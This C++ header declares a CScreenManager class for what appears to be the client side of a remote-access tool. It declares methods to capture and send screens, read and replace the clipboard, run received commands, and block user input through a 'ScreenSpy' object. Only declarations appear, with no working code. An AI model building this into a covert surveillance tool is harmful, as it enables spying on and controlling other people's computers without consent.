#pragma once
#include "Manager.h"
#include "ScreenSpy.h"
class CScreenManager :
	public CManager
{
public:
	CScreenManager(IOCPClient* ClientObject);
	virtual ~CScreenManager();
	static DWORD WINAPI WorkThreadProc(LPVOID lParam);

	VOID SendBitMapInfor();
	VOID SendFirstScreen();
	VOID SendNextScreen();
	VOID OnReceive(PBYTE szBuffer, ULONG ulLength);
	VOID UpdateClientClipboard(char * szBuffer, ULONG ulLength);
	VOID SendClientClipboard();
	VOID ProcessCommand(LPBYTE szBuffer, ULONG ulLength);
public:
	HANDLE m_WorkThreadHandle;
	BOOL m_bIsWorking;
	BOOL m_bIsBlockInput;

	CScreenSpy* m_ScreenSpyObject;
};

